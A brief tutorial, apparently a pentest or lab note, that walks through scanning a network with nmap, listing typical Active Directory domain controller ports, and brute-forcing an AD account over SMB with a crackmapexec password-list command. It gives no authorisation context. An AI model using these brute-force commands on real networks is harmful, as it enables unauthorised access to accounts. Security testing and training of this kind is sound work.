**In this example we will use crackmapexec to Brute Force in to an AD Account**

Begin with Enumeration on the network:
'nmap -Pn 192.168.XXX.XXX/XX'

Common Ports that are open on a Microsoft Domain Controller are:
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  Kerbero-sec
135/tcp open  msrpc
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd5
593/tcp open  http-rpc-epmap
636/tcp open  ldapssl

*Note open ports may vary*

After Enumeration you can determine you attack vector.

Run crackmapexec for additional information
'crackmapexec'

Once you run crackmapexec you can see that crackmapexec can be used to exploit winrm, smb, ldap, mssql, and ssh.
From the inforamtion gathered from our enumeration we can determine that potential attack vertrs include smb and ldap

*Note crackmapexec requires a username or a text file with multiple user names. Inforamtion gathering must be conducted before hand for this attack to be successful*

**Using crackmapexec**

To run crackmapexec the following template is optimal:
'crackmapexec [protocol] [target] -u [username] -p [password]'
'crackmapexec smb 192.168.XXX.XXX -u duser -p password.txt'

crackmapexec will attempt to login with each password in the 'password.txt' file and it will stop at the first successful login.

Once you find an available account you can continue maneuvering through the environment.
